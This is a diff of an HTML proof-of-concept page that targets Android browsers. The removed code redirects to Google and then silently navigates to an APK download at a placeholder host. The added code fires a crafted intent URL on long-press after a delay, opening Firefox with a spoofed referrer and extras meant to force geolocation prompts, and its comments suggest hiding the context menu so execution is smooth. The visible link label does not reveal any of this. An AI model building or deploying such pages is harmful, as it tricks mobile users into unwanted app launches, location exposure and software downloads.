@@ -1,53 +1,73 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect & Auto Download</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding-top: 50px;
-            background-color: #f4f4f9;
-        }
-        button {
-            padding: 12px 24px;
-            font-size: 16px;
-            color: #fff;
-            background-color: #007BFF;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Android Intent PoC</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background: #f8f9fa;
+      color: #202124;
+      min-height: 100vh;
+      margin: 0;
+      display: grid;
+      place-content: center;
+      text-align: center;
+    }
+
+    a {
+      display: inline-block;
+      padding: 16px 28px;
+      background: #1a73e8;
+      color: white;
+      text-decoration: none;
+      font-weight: 600;
+      border-radius: 8px;
+    }
+
+    a:active {
+      background: #1557b0;
+    }
+  </style>
 </head>
 <body>
 
-    <h2>Silakan Klik Tombol di Bawah</h2>
-    <p>Akan mengarahkan ke Google, lalu mengunduh file setelah 3 detik.</p>
-    
-    <br>
-    
-    <!-- Tombol Eksekusi -->
-    <button id="triggerBtn">Mulai Proses</button>
+  <h2>Android Intent Test</h2>
+  <a href="https://google.com" id="intentLink">
+    Open Window & Android Intent Test
+  </a>
 
-    <script>
-        document.getElementById('triggerBtn').addEventListener('click', function() {
-            // 1. Redirect instan ke google.com di tab/window saat ini
-            window.location.href = "https://www.google.com";
+  <script>
+    let triggered = false;
 
-            // 2. 3 detik kemudian memicu intent/download link APK
-            setTimeout(function() {
-                // Menggunakan iframe tersembunyi atau window.location untuk memicu file APK
-                window.location.href = "https://download.server.com/app.apk";
-            }, 3000); // 3000 milidetik = 3 detik
-        });
-    </script>
+    const link = document.getElementById("intentLink");
+
+    link.addEventListener("contextmenu", (e) => {
+      // Opsional: cegah menu konteks bawaan browser jika diperlukan agar eksekusi mulus
+      // e.preventDefault(); 
+      
+      if (triggered) return;
+      triggered = true;
+
+      setTimeout(() => {
+        // Intent baru yang diperbarui sesuai permintaan
+        const intentUrl =
+          "intent://firefox.com/?entry=ml&utm_campaign=ml-ardi&coh=230964#Intent;scheme=https;package=org.mozilla.firefox;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;category=android.intent.category.DEFAULT;type=text/html;launchFlags=0x10000000;S.com.android.browser.application_id=org.mozilla.firefox;S.browser_fallback_url=https%3A%2F%2Ffirefox.com%3Fentry%3Dml;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;B.enable_geolocation=true;B.geolocation_enabled=true;B.pref_advanced_geolocation=true;Z.request_location=true;Z.force_geolocation_prompt=true;S.org.mozilla.firefox.EXTRA_GEO_PROMPT=true;end";
+
+        window.location.href = intentUrl;
+
+        setTimeout(() => {
+          triggered = false;
+        }, 1120);
+
+      }, 4400);
+    });
+
+    link.addEventListener("touchstart", () => {}, {
+      passive: true
+    });
+  </script>
 
 </body>
 </html>
